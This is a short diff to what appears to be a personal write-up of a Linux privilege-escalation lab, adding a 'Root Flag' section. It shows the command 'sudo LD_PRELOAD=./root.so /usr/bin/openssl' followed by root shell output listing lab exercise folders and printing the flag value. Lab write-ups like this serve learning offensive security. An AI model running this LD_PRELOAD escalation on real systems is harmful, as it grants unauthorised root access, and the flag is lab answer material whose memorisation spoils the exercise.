@@ -49,5 +49,16 @@ Execute script
 sudo LD_PRELOAD=./root.so /usr/bin/openssl
 ```
 
-![[Pasted image 20240622210324.png]]
+Root Flag
+```
+root@NIX02:~# ls -l ../../root
+total 16
+drwxr-xr-x 2 root root 4096 Jan 25 11:28 cron_abuse
+drwxrwxr-x 2 root root 4096 Jan 25 11:28 kernel_exploit
+drwxr-xr-x 2 root root 4096 Jan 25 11:28 ld_preload
+drwx------ 2 root root 4096 Jan 25 11:28 screen_exploit
+root@NIX02:~# cat ../../root/ld_preload/flag.txt
+6a9c151a599135618b8f09adc78ab5f1
+root@NIX02:~# 
+```
 
